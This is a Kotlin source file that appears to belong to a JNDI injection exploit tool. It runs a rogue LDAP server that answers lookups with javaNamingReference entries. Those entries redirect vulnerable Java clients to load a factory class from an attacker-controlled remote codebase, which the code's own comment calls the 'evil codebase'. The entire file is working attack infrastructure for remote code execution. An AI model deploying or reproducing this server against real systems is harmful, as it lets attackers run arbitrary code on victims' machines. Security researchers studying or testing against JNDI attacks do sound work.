import com.unboundid.ldap.listener.InMemoryDirectoryServer
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig
import com.unboundid.ldap.listener.InMemoryListenerConfig
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor
import com.unboundid.ldap.sdk.Entry
import com.unboundid.ldap.sdk.LDAPResult
import com.unboundid.ldap.sdk.ResultCode
import util.Dict
import util.currentTime
import java.net.InetAddress
import java.net.URL
import javax.net.ServerSocketFactory
import javax.net.SocketFactory
import javax.net.ssl.SSLSocketFactory

class LDAPServer(val port: Int, val command: String, val codebase: URL) {

    fun run() {
        val config = InMemoryDirectoryServerConfig("dc=example,dc=com").apply {
            setListenerConfigs(
                InMemoryListenerConfig(
                    "listen",
                    InetAddress.getByName("0.0.0.0"),
                    port,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    SSLSocketFactory.getDefault() as SSLSocketFactory
                )
            )
            addInMemoryOperationInterceptor(OperationInterceptor(codebase))
        }
        InMemoryDirectoryServer(config).run { startListening() }
        println("${currentTime()} [LDAPSERVER]>> Listening on 0.0.0.0:$port")
    }

    private class OperationInterceptor(
        private val codebase: URL
    ) : InMemoryOperationInterceptor() {
        override fun processSearchResult(result: InMemoryInterceptedSearchResult) {
            val base = result.request.baseDN
            val entry = Entry(base)
            sendResult(result, base, entry)
        }

        /**
         * response the evil codebase path
         */
        private fun sendResult(result: InMemoryInterceptedSearchResult, base: String, entry: Entry) {
            val javaFactory = Dict.references[base]

            if (javaFactory != null) {
                val url = URL("$codebase$javaFactory.class")
                println("${currentTime()} [LDAPSERVER]>> Send LDAP reference result for $base redirecting to $url")
                entry.run {
                    addAttribute("javaClassName", "foo")
                    addAttribute("javaCodeBase", codebase.toString())
                    addAttribute("objectClass", "javaNamingReference")
                    addAttribute("javaFactory", javaFactory)
                }
                result.run {
                    sendSearchEntry(entry)
                    setResult(LDAPResult(0, ResultCode.SUCCESS))
                }
            } else {
                println("${currentTime()} [LDAPSERVER] >> Reference that matches the name($base) is not found")
            }
        }
    }
}
